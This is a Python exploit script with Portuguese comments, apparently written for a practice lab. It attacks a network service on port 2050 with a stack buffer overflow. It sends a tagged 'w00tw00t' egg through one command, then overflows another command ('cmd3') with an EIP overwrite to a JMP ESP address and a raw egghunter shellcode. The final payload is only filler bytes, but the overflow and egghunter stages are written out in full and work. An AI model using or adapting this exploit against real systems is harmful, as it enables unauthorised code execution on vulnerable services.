#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import struct

IP = "192.168.122.49"
PORT = 2050

egghunter = b"\xeb\x2a\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"

# 1º Estágio
shellcode = b'w00tw00t'
shellcode += b"D" * 600

# 2º Estágio
payload = 3000 # Tamanho do Buffer
buffer = b"A" * 48 
buffer += struct.pack('<I', 0x6250129f) # EIP - JMP ESP - 0x6250129f
buffer += b"\x90" * 2
buffer += egghunter
buffer += b"C" * (payload - len(buffer))

# Envio do Primeiro Estágio
print(b"Enviando payload no comando ajuda")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"sair " + shellcode + b"\r\n")
s.close()

# Envio do Segundo Estágio
print(b"Enviando payload no comando cmd3")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"cmd3 /.:/" + buffer + b"\r\n")
s.close()
